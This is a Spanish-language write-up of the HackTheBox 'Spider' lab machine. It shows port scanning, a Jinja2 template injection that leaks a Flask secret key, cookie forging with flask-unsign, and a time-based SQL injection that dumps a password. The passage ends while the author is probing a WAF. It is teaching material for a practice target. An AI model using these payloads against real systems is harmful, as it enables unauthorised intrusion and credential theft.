---
layout      : post
title       : "HackTheBox - Spider"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350banner.png
category    : [ htb ]
tags        : [ SSTI, SQLi, XXE, flask-unsign ]
---
M√°quina Linux nivel dif√≠cil. Mucho jugueteo web e inyecciones. **Server Side Template Injection (SSTI)** tanto **visible** como **blind**, sensualidad con **cookies** y **secret-key**'s, **SQL Injection time-based** y exploraremos data web que es manipulada con **XML** para explotar un **XML External Entity (XXE)** y leer **cualquier** archivo de toooodo el sistema.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350spiderHTB.png" style="width: 100%;"/>

### TL;DR (Spanish writeup)

**Creada por**: [InfoSecJack](https://www.hackthebox.eu/profile/52045) & [chivato](https://www.hackthebox.eu/profile/44614).

A fuego con las inyecciones! (que no se malinterprete e.e)

{% raw %}
Nos encontraremos con una web para comprar sillas üòÑ, podremos registrarnos e iniciar sesi√≥n, jugando con estos dos apartados principalmente encontraremos una **Server Side Template Injection**, inyecci√≥n de **templates**, con ella lograremos ver los valores de configuraci√≥n (`{{config}}`) del template que se esta usando, entre la conf veremos una **Secret-Key**, esto nos permitir√° crear nuevas sesiones para entrar al sitio. 
{% endraw %}

Algo curioso de la data que conforma la sesi√≥n es que hay un objeto que contiene los √≠tems que tenemos en nuestro carrito de compras. Moviendo cositas y probando otras, encontraremos que es un campo vulnerable a **inyecci√≥n SQL time-based**, pero para lograr explotarla debemos jugar con las sesiones (ya que ah√≠ es donde esta el campo vulnerable), por lo que usaremos una herramienta llamada `flask-unsign` para con ayuda de la **secret-key** generar y generar sesiones para cada payload.

> [Scripts que creamos para dumpear la base de datos](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/spider/sqli).

Despu√©s de obtener toda la info importante, lograremos encontrar unas credenciales del usuario **chiv**, us√°ndolas ser√°n v√°lidas contra la web.

Enumerando todo lo que puede hacer **chiv**, llegaremos a un dominio reservado √∫nicamente para el equipo de soporte, ya que contiene un problema, el problema se llama **Server Side Template Injection** *blind-based*, con ella conseguiremos ejecutar comandos en el sistema como **chiv**, logrando as√≠ una **Reverse Shell** como √©l.

Dando vueltas por el sistema veremos que hay un servidor web corriendo localmente en el puerto **8080**, curiosamente lo esta ejecutando el usuario **root**. Generaremos un **Port-Fortwarding** con ayuda de **SSH** para ver mucho mejor el servicio web.

Explor√°ndolo tendremos √∫nicamente un `/login` y un apartado para comprar cosas, pero lo √∫nico funcional es el apartado `/login`. Jugando con las cookies y `flask-unsign`, veremos que la data esta siendo interpretada en formato **XML**, esto nos abrir√° una puerta para probar la vulnerabilidad tipo **XML External Entity (XXE)**, finalmente veremos que es vulnerable. Con ella obtendremos accesos a los archivos del sistema, todo como el usuario **root** ¬øqu√© archivo buscar√≠as?

...

### Clasificaci√≥n de la m√°quina seg√∫n la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350rating.png" style="width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350statistics.png" style="width: 80%;"/>

Le cuesta pero va llegando.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice.

...

Es un camino de verdades y mentiras, pero ¬øes verdad eso?

<ol>
  <!-- Hecho as√≠ para que genere correctamente el √°rbol de enlaces del SQLinjection -->
  <!-- reconocimiento -->
  <li>
    <a href="#reconocimiento">Reconocimiento</a>.
    <ul>
      <li>
        <a href="#enum-nmap">Enumeraci√≥n de puertos con nmap</a>.
      </li>
    </ul>
  </li>
  <!-- enumeraci√≥n  -->
  <li>
    <a href="#enumeracion">Enumeraci√≥n</a>.
    <ul>
      <li>
        <a href="#puerto-80-fail">( ‚úò Divagando) Enumeramos el servidor web del <strong>puerto 80</strong></a>.
      </li>
    </ul>
  </li>
  <!-- explotaci√≥n  -->
  <li>
    <a href="#explotacion">Explotaci√≥n</a>.
    <ul>
      <li>
        <a href="#puerto-80-ssti">( ‚úî Tamos) Encontramos <strong>SSTI</strong> en el apartado <u>/register</u> de la web</a>.
      </li>
      <li>
        <a href="#ssti-secretkey">Obtenemos <strong>Secret Key</strong> mediante el SSTI</a>.
      </li>
      <li>
        <a href="#shop-found-sqli-timebased">Encontramos <strong>inyecci√≥n SQL basada en tiempo</strong></a>.
        <ul>
          <li>
            <a href="#sqli-shop-dbs">Extraemos las bases de datos</a>.
          </li>
          <li>
            <a href="#sqli-shop-tables">Extraemos las tablas de alguna base de datos</a>.
          </li>
          <li>
            <a href="#sqli-shop-columns">Extraemos las columnas de alguna tabla</a>.
          </li>
          <li>
            <a href="#sqli-shop-dump-data">Dumpeamos la data de alguna columna (encontramos credenciales)</a>.
          </li>
        </ul>
      </li>
      <li>
        <a href="#shop-support-ticket">Explorando nuevo apartado web para enviar tickets, ahora como <strong>admin</strong></a>.
        <ul>
          <li>
            <a href="#shop-support-ticket-ssti-rce">Conseguimos RCE explotando <u>SSTI</u> bypasseando cositas</a>.
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <!-- privesc -->
  <li>
    <a href="#escalada-de-privilegios">Encontramos servicio web siendo ejecutado por <strong>root</strong> localmente</a>.
    <ul>
      <li>
        <a href="#fortwarding-enum-8080">Enumeramos puerto <strong>8080</strong> del <strong>localhost</strong> usando <u>port-fortwarding</u></a>.
      </li>
      <li>
        <a href="#fortwarding-unsign-xml">Decodeamos cookie para obtener estructura <u>XML</u></a>.
      </li>
      <li>
        <a href="#fortwarding-xxe">Estudiamos como explotar un <strong>XXE</strong></a>.
      </li>
      <li>
        <a href="#fortwarding-xxe-idrsa-root">Leemos archivos del sistema como usuario root por medio del XXE</a>.
      </li>
    </ul>
  </li>
</ol>

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Enumeraci√≥n de puertos con <u>nmap</u> [üìå](#enum-nmap) {#enum-nmap}

Empezaremos encontrando que puertos est√°n abiertos en la m√°quina, lo haremos con ayuda de **nmap**:

```bash
‚ù± nmap -p- --open -v 10.10.10.243 -oG initScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que est√°n abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [funci√≥n **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Este escaneo nos muestra:

```bash
‚ù± cat initScan
# Nmap 7.80 scan initiated Sat Jul 10 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.243
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.243 () Status: Up
Host: 10.10.10.243 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Sat Jul 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 74.31 seconds
```

| Puerto | Descripci√≥n |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Nos brinda una terminal de manera segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos presenta un servidor web. |

**~(Usando la funci√≥n `extractPorts` (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno (en este caso es medio KLK, pero es funcional para cuando tenemos muuuchos puertos**
 
```bash
‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.243
    [*] Open ports: 22,80

[*] Ports copied to clipboard
```

**)~**

```bash
‚ù± nmap -p 22,80 -sC -sV 10.10.10.243 -oN portScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versi√≥n del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y este escaneo nos devuelve:

```bash
‚ù± cat portScan
# Nmap 7.80 scan initiated Sat Jul 10 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.243
Nmap scan report for 10.10.10.243
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)
|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)
|_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://spider.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 17.22 seconds
```

Tenemos algunas cositas relevantes:

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80     | HTTP     | nginx 1.14.0 |

* Vemos un redirect hacia el dominio `spider.htb`

Agregu√©moslo de una al archivo [/etc/hosts](https://www.ionos.es/digitalguide/servidores/configuracion/archivo-hosts/):

---

```bash
‚ù± cat /etc/hosts
...
10.10.10.243  spider.htb
...
```

Poco m√°s, exploremos a ver como romper esta vaina!! e.e

...

# Enumeraci√≥n [#](#enumeracion) {#enumeracion}

...

## Damos vueltas (perdidos) por el puerto 80 [üìå](#puerto-80-fail) {#puerto-80-fail}

![350page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80.png)

Opa, muchas ü™ë e.e A la izquierda tenemos varios √≠tems, **login**, **admin**, **register**, etc...

En el c√≥digo fuente de la web encontramos 2 cositas interesantes:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_rateLIMITenabled.png" style="width: 100%;"/>

Esto me hace pensar que probablemente debamos hacer **fuzzing** y tengamos que [bypassear el **rate-limit**](https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass):

> Que ser√≠an las peticiones que permite enviar cada cierto tiempo con una misma IP, si mi IP envia muchas peticiones seguidas, lo m√°s probable es que sea bloqueada para as√≠ evitar colapsar la web.

Entonces para bypassearlo le hacemos creer que el que hace las peticiones es el **localhost** (`127.0.0.1`), as√≠ no nos bloquear√≠a. Y si se da el caso que nos bloquea, podemos pensar en algo [como esto](https://hackerone.com/reports/1067533) (`127.0.0.1`, `127.0.0.2`, `127.0.0.3`...)

Tambi√©n encontramos unas redes sociales, que pueda que no sean necesarias, pero por si algo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_socialNetworks.png" style="width: 100%;"/>

Pues veamos los apartados **login** y **register**...

...

Intentando credenciales por default no conseguimos nada contra el **login**, registremonos:

![350page80_register](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_register.png)

Nos redirecciona al login y genera un **UUID (Identificador √∫nico universal)** para nuestro usuario:

![350page80_login](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_login.png)

Nos logeamos y caemos de nuevo en todas las sillas, solo que ahora tenemos un nuevo apartado a la izquierda, **User Information**:

![350page80_dashboardLANZ](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_dashboardLANZ.png)

![350page80_userInformation](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_userInformation.png)

Nada, simplemente los datos de nuestro usuario, nombre y **UUID** asociado.

...

Si intentamos entrar al apartado **Admin** (que nos redireccionar√≠a a `/main`) nos devuelve al **index** :(

Viendo las sillas, encontramos un usuario en las que se llaman **BLACK CHAIR**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_blackChair_user.png" style="width: 100%;"/>

* **chiv**, lo guardamos por si algo.

Jugando a agregar sillas a nuestra compra, si nos fijamos en el carrito hay una opci√≥n para borrar √≠tems:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_remove.png" style="width: 100%;"/>

Si validamos, hace el borrado llamando la variable `remove` y pas√°ndole un numero, por ejemplo:

* `http://spider.htb/cart?remove=2`

Intentando inyecciones por default no conseguimos ver algo distinto, pero podemos guardarlo en nuestras notas por si algo...

Algo curioso al estar ac√° fue el c√≥digo fuente, en el t√≠tulo vemos algo llamativo:

![350page80_reference_AmadoTemplate](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_reference_AmadoTemplate.png)

Buscando por internet algo vulnerable sobre ese template no conseguimos nada, pero la palabra <u>template</u> me trajo a la cabeza otra idea, el probar sobre la variable `remove` payloads que exploten inyecciones tipo **Server Side Template Injection**.

üñ•Ô∏è ***Server-side template injection is a vulnerability where the attacker injects malicious input into a template to execute commands on the server-side.*** [A Pentester's Guide to Server Side Template Injection (SSTI)](https://blog.cobalt.io/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68)

Sencillito, [ac√° hay varios payloads](https://github.com/payloadbox/ssti-payloads) de ejemplo, pero jugando con ellos tampoco vemos algo reflejado en la **web** üòû (ni en los otros apartados)...

Algunos b√°sicos:

{% raw %}
```html
${7*3}
{{7*3}}
<%= 7*3 %>
```
{% endraw %}

Donde para saber que estamos inyectando algo, tendr√≠amos que ver el resultado de la operaci√≥n en alguna parte de la web, en este caso ser√≠a **<u>21</u>**.

...

# Explotaci√≥n [#](#explotacion) {#explotacion}

...

## Encontramos <u>SSTI</u> en apartado <u>/register</u> de la web [üìå](#puerto-80-ssti) {#puerto-80-ssti}

En este punto decid√≠ volver a empezar a ver si era que nos hab√≠a visto algo.

Si intentamos reg√≠stranos como **admin** o **chiv** no se refleja nada distinto a **lanz** dentro, pero si nos registramos con una sintaxis **HTML** sencilla, vemos el resultado reflejado en el **dashboard**:

> El campo `username` solo permite **10 caracteres**, lo cual ta curioso.

![350page80_register_injectHTML](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_register_injectHTML.png)

Nos logeamos y encontramos:

![350page80_dashboard_injectHTML_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_dashboard_injectHTML_done.png)

> Se ve el **<u>8</u>** gigante ¬øno? e.e

![350page80_userInformation_injectHTML_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_userInformation_injectHTML_done.png)

Podemos inyectar HTML, pero solo se refleja en el dashboard, en el apartado **/user** vemos textualmente lo que escribimos...

Al tener un campo de **10** caracteres, no hay mucho para probar. 

**Testeando entre <u>SQLi</u> y <u>SSTI</u>, nos cambia la cara al obtener respuesta por parte del <u>SSTI</u>**:

* Nos registramos > Ingresamos > Vamos al dashboard > Vemos la info de nuestro usuario:

---

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_gif_found_SSTI.gif" style="width: 100%;"/>

PERFECTOOOO!! Ahora nos queda ver como explotamos esto con **10** caracteres :P

...

## Obtenemos <u>Secret Key</u> mediante el <u>SSTI</u> [üìå](#ssti-secretkey) {#ssti-secretkey}

Siguiendo estas gu√≠as: 

* [hacktricks - SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).
* [portswigger - Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection).

Nos explican la metodolog√≠a para explotar un **SSTI**, pero adem√°s vemos una imagen donde tenemos la forma de identificar ante que **template** estamos ([hay muuuchos tipos](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#exploits)):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350google_typesSSTI.png" style="width: 100%;"/>

> Tomada de: [hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) y [portswigger](https://portswigger.net/research/server-side-template-injection).

En uno de los ejemplos, vemos:

{% raw %}
üó∫Ô∏è ***The probe `{{7*'7'}}` would result in `49` in <u>Twig</u> or `7777777` in <u>Jinja2</u>***
{% endraw %}

Si hacemos la prueba, obtenemos:

![350page80_SSTI_jinja2](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_SSTI_jinja2.png)

Listones, entonces podemos quedarnos con la idea que estamos ante el template [Jinja2](https://jinja.palletsprojects.com/en/3.0.x/) (: y hacemos m√°s peque√±a nuestra investigaci√≥n...

Apoy√°ndonos de nuevo con la gu√≠a de [hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python) sobre <u>SSTI</u> en **Jinja2**, tenemos algunos payloads para probar (teniendo en cuenta nuestros 10 caracteres se reduce mucho m√°s ü§≠), entre ellos obtenemos un resultado interesante al registrarnos con:

{% raw %}
```jinja2
{{config}}
```
{% endraw %}

![350page80_SSTI_jinja2_config](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_SSTI_jinja2_config.png)

```json
<Config {
    'ENV': 'production',
    'DEBUG': False,
    'TESTING': False,
    'PROPAGATE_EXCEPTIONS': None,
    'PRESERVE_CONTEXT_ON_EXCEPTION': None,
    'SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942',   
    'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31),
    'USE_X_SENDFILE': False,
    'SERVER_NAME': None,
    'APPLICATION_ROOT': '/',
    'SESSION_COOKIE_NAME': 'session',
    'SESSION_COOKIE_DOMAIN': False,
    'SESSION_COOKIE_PATH': None,
    'SESSION_COOKIE_HTTPONLY': True,
    'SESSION_COOKIE_SECURE': False,
    'SESSION_COOKIE_SAMESITE': None,
    'SESSION_REFRESH_EACH_REQUEST': True,
    'MAX_CONTENT_LENGTH': None,
    'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0,43200),
    'TRAP_BAD_REQUEST_ERRORS': None,
    'TRAP_HTTP_EXCEPTIONS': False,
    'EXPLAIN_TEMPLATE_LOADING': False,
    'PREFERRED_URL_SCHEME': 'http',
    'JSON_AS_ASCII': True,
    'JSON_SORT_KEYS': True,
    'JSONIFY_PRETTYPRINT_REGULAR': False,
    'JSONIFY_MIMETYPE': 'application/json',
    'TEMPLATES_AUTO_RELOAD': None,
    'MAX_COOKIE_SIZE': 4093,
    'RATELIMIT_ENABLED': True,
    'RATELIMIT_DEFAULTS_PER_METHOD': False,
    'RATELIMIT_SWALLOW_ERRORS': False,
    'RATELIMIT_HEADERS_ENABLED': False,
    'RATELIMIT_STORAGE_URL': 'memory://',
    'RATELIMIT_STRATEGY': 'fixed-window',
    'RATELIMIT_HEADER_RESET': 'X-RateLimit-Reset',
    'RATELIMIT_HEADER_REMAINING': 'X-RateLimit-Remaining',
    'RATELIMIT_HEADER_LIMIT': 'X-RateLimit-Limit',
    'RATELIMIT_HEADER_RETRY_AFTER': 'Retry-After',
    'UPLOAD_FOLDER': 'static/uploads'
}>
```

Vemos una **Secret Key** :o y que `RATE-LIMIT` esta habilitado.

Lo que se me ocurri√≥ es que debamos usar la **secret key** para generar una **cookie** "firmada" que nos permita entrar al apartado `/main` (admin), pero lo extra√±o es que nuestra cookie original no esta "firmada", ni la data que contiene nos permite "regenerar" una con alg√∫n √≠tem como "`admin: True`"...

Tomamos la cookie al estar logeados y la pegamos en [jwt.io](https://jwt.io/), ah√≠ vemos la estructura de nuestra cookie:

![350google_jwtIO_cookie_unsigned](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350google_jwtIO_cookie_unsigned.png)

Nos indica que nuestro token no parece ser un **JSON Web Token**, lo que me dejo :O PEEERO, al menos vemos la estructura que esta detr√°s del token, nuestro carrito de compras y el **uuid** asociado.

Haciendo algunas pruebas no llegamos a nada y siempre obtenemos que nuestro token no es v√°lido...

...

## Encontramos <u>SQLI</u> basada en tiempo [üìå](#shop-found-sqli-timebased) {#shop-found-sqli-timebased}

Buscando que hacer con una **Secret Key** o como generar tokens con ella, encontr√© muuuchos recursos, pero ca√≠ en dos s√∫per interesantes:

* [**Conocimiento**: Links para entender el funcionamiento de una **Secret Key**](https://www.reddit.com/r/django/comments/i4qxek/what_can_i_actually_do_with_someones_secret_key/).
* [Creando cookies en **flask** con una **Secret Key**](https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce).

Lo interesante de este √∫ltimo es una herramienta que usa para generar tokens de sesi√≥n sin firmar, les dejo el [repo](https://github.com/Paradoxis/Flask-Unsign):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350google_flaskUnsign_found.png" style="width: 100%;"/>

Listones, pues instal√©monos la herramienta y d√©mosle:

```bash
‚ù± flask-unsign --unsign --server http://spider.htb
```

![350bash_flaskUnsign_server](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350bash_flaskUnsign_server.png)

Bien, siguiendo la imagen de su uso, ahora ejecutar√≠amos (arreglando el apartado `cookie` para que tome tambi√©n el `uuid` y agregando un √≠tem a nuestro carrito de compras para ver como lo agrega):

![350page80_additem_cart](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_additem_cart.png)

![350google_jwtIO_itemincart](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350google_jwtIO_itemincart.png)

Ahora ejecutamos:

```bash
‚ù± flask-unsign --sign --cookie "{'cart_items':['4'],'uuid':'0f4f96a2-0807-4874-800c-558bda2e2ffb'}" --secret "Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942"
eyJjYXJ0X2l0ZW1zIjpbIjQiXSwidXVpZCI6IjBmNGY5NmEyLTA4MDctNDg3NC04MDBjLTU1OGJkYTJlMmZmYiJ9.YOyNuw.8VsSgPzI7QD_gblCi-drNa_qnEI
```

Nos genera la **cookie**, pues (para mostrarles) usemos **Burp**, borramos la cookie actual y la remplazamos por la nueva, para validar si es funcional hacemos una petici√≥n hacia `/cart`:

![350burp_cart_testNEWcookie_bad](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350burp_cart_testNEWcookie_bad.png)

![350burp_cart_testNEWcookie_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350burp_cart_testNEWcookie_done.png)

Perfect√≠simo, cambiando la √∫ltima letra de la cookie nos muestra un error interno y colocando la cookie buena obtenemos un **OK**, as√≠ que la herramienta es funcional, ahora nos queda ver como podemos jugar con ella y sobre todo saber que debemos generar en la cookie :)

Pues tenemos dos campos, los dos son interesantes, porque seg√∫n que numero haya en `cart_items` nos devuelve algo en `/cart` (o sea esta extrayendo algo de alg√∫n lado) y por otro lado `uuid` podemos pensar que nos refleja su info en el apartado `/user`...

Entonces podemos probar si encontramos alguna vulnerabilidad relacionada con inyecciones en alguno de los dos (o los dos)...

Cre√°ndonos un script que tome un archivo de payloads (`payload.txt`), genere el **token de sesi√≥n** y lo valide contra `/cart` logramos encontrar cositas...

Primero lo prob√© con [payloads de **SSTI**](https://github.com/payloadbox/ssti-payloads/blob/master/Intruder/ssti-payloads.txt), pero ning√∫n campo nos mostr√≥ nada distinto.

Despu√©s pas√© a probar [payloads de **SQLI**](https://github.com/payloadbox/sql-injection-payload-list) y en este caso si encontramos algo al intentar con los de [**SQLI time-based**](https://github.com/payloadbox/sql-injection-payload-list#generic-time-based-sql-injection-payloads), les dejo el script:

> [tryingPayloads.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/spider/tryingPayloads.py)

Entonces, tomamos cada l√≠nea, si la petici√≥n genera un `timeout` de **3** segundos, sabemos que ese payload esta generando una inyecci√≥n SQL basada en tiempo, por lo tanto ser√° nuestro punto de partida para crear las consultas maliciosas:

![350bash_tryingPayloads_SQLItime_found](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350bash_tryingPayloads_SQLItime_found.png)

> Esos son algunos de los payloads que nos dan resultado, nos quedaremos con `1 or sleep(5)#`.

Pues ahora veamos como explotar esta inyecci√≥n **SQL** para extraer info de las bases de datos (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350google_gif_dealwithit.gif" style="width: 70%;"/>

...

Probando y probando finalmente encontramos una manera, empezaremos extrayendo que bases de datos existen en el servidor **SQL**, algunos recursos pa cheeeeck:

* [Blind SQL injection](https://medium.com/@nyomanpradipta120/blind-sql-injection-ac36d2c4daab).
* [BLIND and TIME-BASED SQL INJECTIONS](http://kaoticcreations.blogspot.com/p/blind-time-based-sql-injections.html).
* [Time-Based Blind SQL Injection Attacks](https://www.sqlinjection.net).
* [Examining the database in SQL injection attacks](https://portswigger.net/web-security/sql-injection/examining-the-database).

---

### Extraemos las <u>bases de datos</u> [ü©∫](#sqli-shop-dbs) {#sqli-shop-dbs}

> Esta claro que todo esto se podria haber hecho en un solo script, pero bueno, la loquera... Les queda de tarea :P

...

Jugando de nuevo con **Python** conseguimos extraer todas las bases de datos que existen en el sistema:

> [dbname.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/spider/sqli/dbname.py)

üëÄ

```bash
‚ù± python3 dbname.py 
[+] Database [0]: information_schema
[+] Database [1]: mysql
[+] Database [2]: performance_schema
[+] Database [3]: shop
[+] Database [4]: sys
```

Pererererfecto, existen 5 bases de datos, las comunes y una distinta llamada **shop**, pues sigamos nuestro camino enfocado en ella.

### Extraemos las <u>tablas</u> de alguna base de datos [ü©∫](#sqli-shop-tables) {#sqli-shop-tables}

> [tables.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/spider/sqli/tables.py)

```bash
‚ù± python3 tables.py -d shop
[+] Table [0]: items
[+] Table [1]: messages
[+] Table [2]: support
[+] Table [3]: users
```

Solo 4 tablas, enfoqu√©monos principalmente en `users`.

### Extraemos las <u>columnas</u> de alguna tabla [ü©∫](#sqli-shop-columns) {#sqli-shop-columns}

> [columns.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/spider/sqli/columns.py)

```bash
‚ù± python3 columns.py -d shop -t users
[*] Tabla 'users' de la base de datos 'shop'
[+] Column [0]: id
[+] Column [1]: name
[+] Column [2]: password
[+] Column [3]: uuid
```

Opa, dos campos interesantes, `name` y `password`, pues enumer√©moslos.

### <u>Dumpeamos la data</u> de alguna columna [ü©∫](#sqli-shop-dump-data) {#sqli-shop-dump-data}

> [dump_data.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/spider/sqli/dump_data.py)

**Columna <u>name</u>**:

```bash
‚ù± python3 dump_data.py -d shop -t users -c name
[*] Extrayendo columna 'name' de la tabla 'users' en la base de datos 'shop'
[+] name [0]: chiv
[+] name [1]: lanz
```

Bien, ahora veamos las contrase√±as...

**Columna <u>password</u>**:

```bash
‚ù± python3 dump_data.py -d shop -t users -c password
[*] Extrayendo columna 'password' de la tabla 'users' en la base de datos 'shop'
[+] password [0]: ch1VW4sHERE7331
[+] password [1]: hola
```

:O Vemos la contrase√±a de **chiv** en texto plano (y la m√≠a e.e). Tenemos dos espacios para probarlas, en la web o con **SSH**...

```bash
‚ù± ssh chiv@spider.htb
chiv@spider.htb: Permission denied (publickey).
```

F, para probar con la web necesitamos el **uuid** de **chiv**, extraig√°moslo:

> Para hacerlo m√°s rapido, cambiamos nuestro diccionario a:
> ```py
> dic_letters = "-" + string.hexdigits + "¬£"
> ```

**Columna <u>uuid</u>**:

```bash
‚ù± python3 dump_data.py -d shop -t users -c uuid
[*] Extrayendo columna 'uuid' de la tabla 'users' en la base de datos 'shop'
[+] uuid [0]: 129f60ea-30cf-4065-afb9-6be45ad38b73
```

Puuuuuuuuueeeeeeesssss si intentamos logearnos con las credenciales obtenidas:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_main_asCHIV.png" style="width: 100%;"/>

Opa, tamos dentro papaiiiiiiii y contamos con algunos √≠tems a probar, si damos clic en el bot√≥n `messages`, caemos ac√°:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_messages_asCHIV.png" style="width: 100%;"/>

Jmm, hab√≠a pensado que se parec√≠a a un dominio (se parece :P, pero no lo es) pero si intentamos colocar esa ruta junto a `http://spider.htb` obtenemos respuesta:

![350page80_unfinishedPATH_asCHIV](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_unfinishedPATH_asCHIV.png)

Un portal que a√∫n no ha sido terminado... Lo cual es interesante porque puede tener fallitas por ah√≠, pues exploremos a ver.

...

## Explorando apartado para enviar tickets [üìå](#shop-support-ticket) {#shop-support-ticket}

Algo curioso al probar cositas fueron las respuestas con cadenas que contuvieran alguno de estos caracteres: `{}'._`, por ejemplo:

> **(Todo en el campo <u>contact number or email</u>)**.

{% raw %}
Probando `{{config}}` obtenemos:

> Why would you need '{{' or '}}' in a contact value?
{% endraw %}

Jmmm, no s√©, ¬øpara jaqui-arte? ü§º‚Äç‚ôÄÔ∏è

{% raw %}
(Intentando bypassear este filtro lo logramos, pero no llegamos a que interprete `{{config}}` üòì)
{% endraw %}

Probando los caracteres `'`, `_` y `.`:

```html
> Hmmm, you seem to have hit a our WAF with the following chars: ' 
> Hmmm, you seem to have hit a our WAF with the following chars: _
> Hmmm, you seem to have hit a our WAF with the following chars: .
```

